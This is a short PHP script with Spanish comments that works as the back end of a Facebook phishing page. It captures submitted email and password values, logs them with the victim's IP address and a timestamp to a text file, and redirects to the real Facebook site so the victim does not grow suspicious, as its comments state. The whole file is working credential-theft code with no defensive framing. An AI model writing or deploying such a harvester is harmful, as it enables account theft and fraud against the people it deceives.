<?php
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; // Guarda la IP de la víctima
$date = date('d/m/Y H:i:s');

$data = "Email: $email | Password: $password | IP: $ip | Fecha: $date\n";

file_put_contents('credenciales.txt', $data, FILE_APPEND);

// Redirige a la página real de Facebook para no levantar sospechas
header('Location: https://facebook.com');
exit();
?>
